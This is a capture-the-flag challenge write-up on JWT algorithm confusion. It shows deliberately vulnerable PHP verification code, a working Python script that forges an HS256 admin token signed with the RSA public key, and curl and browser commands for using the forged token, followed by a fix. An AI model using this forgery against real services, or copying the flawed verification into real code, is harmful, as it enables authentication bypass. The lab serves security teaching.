# JWT Algorithm Confusion (RS256 → HS256) — CTF Challenge

**Category:** Web  
**Difficulty:** Hard  

## Description

The application issues RS256 JWTs. The verification code accepts both RS256 and HS256
and uses the RSA public key as the key material in both cases. By switching `alg` to
`HS256` and signing the forged token with the RSA **public key** as the HMAC secret,
the server will accept it as valid.

## Setup

```bash
docker compose up --build
```

Visit: http://localhost:8093

---

## The Vulnerability

```php
$pubkey = file_get_contents('/keys/public.pem');

if ($alg === 'RS256') {
    openssl_verify("$h.$p", b64url_dec($sig), $pubkey, OPENSSL_ALGO_SHA256);

} elseif ($alg === 'HS256') {
    // RSA public key used as HMAC secret — algorithm confusion
    $expected = b64url_enc(hash_hmac('sha256', "$h.$p", $pubkey, true));
    hash_equals($expected, $sig);
}
```

The server trusts the `alg` field in the JWT header and branches on it.
For HS256 it uses the *public key bytes* as the HMAC secret — an attacker who
downloads the public key can compute a valid signature for any payload.

---

## Attack Steps

### 1. Get a legitimate RS256 token
Login with `guest:guest`. Copy the JWT from the dashboard.

### 2. Discover the public key
The HTML source contains a hint. Fetch:
```
GET http://localhost:8093/pubkey
```

### 3. Forge an HS256 admin token

```python
#!/usr/bin/env python3
import hmac, hashlib, base64, json, requests

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Fetch the public key
pubkey = requests.get('http://localhost:8093/pubkey').content   # raw bytes

# Build forged header + payload
header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
payload = b64url(json.dumps({"username": "admin", "role": "admin", "iat": 0}, separators=(',', ':')))

# Sign with RSA public key as HMAC-SHA256 secret
msg = f"{header}.{payload}"
sig = b64url(hmac.new(pubkey, msg.encode(), hashlib.sha256).digest())

forged = f"{msg}.{sig}"
print(forged)
```

### 4. Set the cookie and get the flag

**Browser DevTools console:**
```js
document.cookie = "token=<forged_token>; path=/"
location.reload()
```

**Or with curl:**
```bash
curl -s http://localhost:8093/ -b "token=<forged_token>" | grep -o 'THIS.*FLAG'
```

---

## Why it works

With RS256:
- Server signs with **private key** → attacker cannot forge (private key is secret)
- Server verifies with **public key** → anyone can verify

With the confusion bug:
- Attacker changes `alg` to `HS256`
- Server now does: `HMAC-SHA256(header.payload, public_key_bytes)`
- Attacker knows the public key → can compute the exact same HMAC → valid signature

## Fix

Never trust the `alg` field in the token header. Hardcode the expected algorithm
on the server side and reject tokens that specify a different one:

```php
// Correct — algorithm fixed server-side, not taken from the token
if ($alg !== 'RS256') return null;
openssl_verify("$h.$p", b64url_dec($sig), $pubkey, OPENSSL_ALGO_SHA256);
```
